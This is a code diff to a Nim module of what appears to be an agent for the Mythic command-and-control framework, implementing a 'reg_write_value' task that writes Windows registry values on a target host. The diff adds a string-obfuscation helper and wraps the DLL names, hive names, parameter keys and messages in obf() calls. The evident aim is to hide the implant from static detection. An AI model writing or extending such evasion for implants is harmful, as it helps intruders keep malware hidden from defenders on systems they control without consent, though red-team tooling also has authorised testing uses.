@@ -1,6 +1,7 @@
 import std/[json, strformat, strutils]
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 
 when defined(windows):
   import winim/lean
@@ -13,27 +14,27 @@ when defined(windows):
   
   proc RegOpenKeyExW(hKey: HKEY, lpSubKey: LPCWSTR, ulOptions: DWORD, 
                      samDesired: DWORD, phkResult: ptr HKEY): LONG 
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   proc RegSetValueExW(hKey: HKEY, lpValueName: LPCWSTR, Reserved: DWORD,
                       dwType: DWORD, lpData: ptr BYTE, cbData: DWORD): LONG 
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   proc RegCloseKey(hKey: HKEY): LONG 
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   proc getHiveHandle(hive: string): HKEY =
     ## Convert hive string to HKEY handle
     case hive.toUpperAscii()
-    of "HKCR":
+    of obf("HKCR"):
       return cast[HKEY](0x80000000'u32)  # HKEY_CLASSES_ROOT
-    of "HKCU":
+    of obf("HKCU"):
       return cast[HKEY](0x80000001'u32)  # HKEY_CURRENT_USER
-    of "HKLM":
+    of obf("HKLM"):
       return cast[HKEY](0x80000002'u32)  # HKEY_LOCAL_MACHINE
-    of "HKU":
+    of obf("HKU"):
       return cast[HKEY](0x80000003'u32)  # HKEY_USERS
-    of "HKCC":
+    of obf("HKCC"):
       return cast[HKEY](0x80000005'u32)  # HKEY_CURRENT_CONFIG
     else:
       return cast[HKEY](0)
@@ -43,16 +44,16 @@ proc regWriteValue*(taskId: string, params: JsonNode): JsonNode =
   when defined(windows):
     try:
       # Parse parameters
-      let hive = params["hive"].getStr()
-      let key = params["key"].getStr()
-      let valueName = params["value_name"].getStr()
-      let valueValue = params["value_value"].getStr()
+      let hive = params[obf("hive")].getStr()
+      let key = params[obf("key")].getStr()
+      let valueName = params[obf("value_name")].getStr()
+      let valueValue = params[obf("value_value")].getStr()
       
       debug &"[DEBUG] reg_write_value: hive={hive}, key={key}, name={valueName}, value={valueValue}"
       
       let hiveHandle = getHiveHandle(hive)
       if hiveHandle == cast[HKEY](0):
-        return mythicError(taskId, "Invalid hive specified")
+        return mythicError(taskId, obf("Invalid hive specified"))
       
       let keyNameW = newWideCString(key)
       let valueNameW = newWideCString(valueName)
@@ -60,7 +61,7 @@ proc regWriteValue*(taskId: string, params: JsonNode): JsonNode =
       
       let status = RegOpenKeyExW(hiveHandle, keyNameW, 0, KEY_SET_VALUE, addr keyHandle)
       if status != ERROR_SUCCESS:
-        return mythicError(taskId, &"Failed to open registry key: {status}")
+        return mythicError(taskId, obf("Failed to open registry key: ") & $status)
       
       # Try to parse as DWORD, otherwise use string
       var setStatus: LONG
@@ -96,11 +97,11 @@ proc regWriteValue*(taskId: string, params: JsonNode): JsonNode =
       discard RegCloseKey(keyHandle)
       
       if setStatus == ERROR_SUCCESS:
-        return mythicSuccess(taskId, &"Successfully set registry value: {valueName} = {valueValue}")
+        return mythicSuccess(taskId, obf("Successfully set registry value: ") & valueName & obf(" = ") & valueValue)
       else:
-        return mythicError(taskId, &"Failed to set registry value: {setStatus}")
+        return mythicError(taskId, obf("Failed to set registry value: ") & $setStatus)
       
     except Exception as e:
-      return mythicError(taskId, &"reg_write_value error: {e.msg}")
+      return mythicError(taskId, obf("reg_write_value error: ") & e.msg)
   else:
-    return mythicError(taskId, "reg_write_value command is only available on Windows")
+    return mythicError(taskId, obf("reg_write_value command is only available on Windows"))
